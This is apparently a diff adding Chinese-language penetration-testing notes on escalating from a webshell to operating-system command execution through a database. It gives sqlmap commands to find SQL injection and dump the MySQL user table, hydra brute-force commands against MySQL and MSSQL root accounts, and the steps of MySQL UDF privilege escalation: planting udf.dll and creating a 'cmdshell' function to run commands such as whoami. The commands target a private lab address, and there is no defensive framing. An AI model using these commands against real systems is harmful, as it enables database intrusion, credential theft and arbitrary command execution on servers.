@@ -1,0 +1,32 @@
+  本质上还是给操作系统提权:
+    通过网站漏洞难道webshell之后,windows菜刀和linux脏牛无法提权,可以实施数据库提权,从而达到执行操作系统的目的;
+1.提权条件:
+   (1)获取数据库最高权限的账号和密码;
+   (2)目标数据库没有进行目录限制:(secure_file_priv=)说明数据库配置文件为空;
+      找my_ini文件
+      null是无法导出,/tmp/是可以导出,啥都不写是不做任何限制;;
+2.sqlmap工具利用:依赖python 2.7
+   (1)测注入点:
+     python2 sqlmap.py -u"http://192.168.157.129:90/sql.php?id=1(主键一般存在)"
+   (2)存在直接跑账号密码:
+      python2 sqlmap.py -u"http://192.168.157.129:90/sql.php?id=1"--dbs
+   (3)看数据库表名:
+      python2 sqlmap.py -u"http://192.168.157.129:90/sql.php?id=1"-D mysql --table
+   (4)看user表:
+      python2 sqlmap.py -u"http://192.168.157.129:90/sql.php?id=1"-D mysql -Tuser --columns --dump
+3.暴力破解:
+  mysql: hydra -l root -p /root/top100.txt -t 8 -s 3306 192.168.157.129 mysql
+  mssql: hydra -l sa -p /root/top100.txt -t 8 -Vv -s 1433 192.168.157.129 mssql
+4.提权:UDF提权   mysql综合利用工具;
+  (1)UDF提权 user defined function 本质上还是利用了mysal能够执行系统命令的特点;通过sql语句调用cmd;
+  (2)上传利用UDF工具分两种:
+     mysql小于5.2 把udf.dll导入windows下的system或者system32
+     大于5.2放入MySQL数据库的默认安装路径:program file/mysql/mysql server 5.5/lib/plugin/udf.dll
+  (3)思路:已经得到了数据库的账号和密码;
+     菜刀进入数据库命令行:select version();
+     mysql综合利用工具 udf提权
+     导入udf.dll
+     执行
+     creat fuction cmdshell returns string soname'udf.dll';
+     select cmdshell('whoami')
+     select cmdshell('ipconfig')
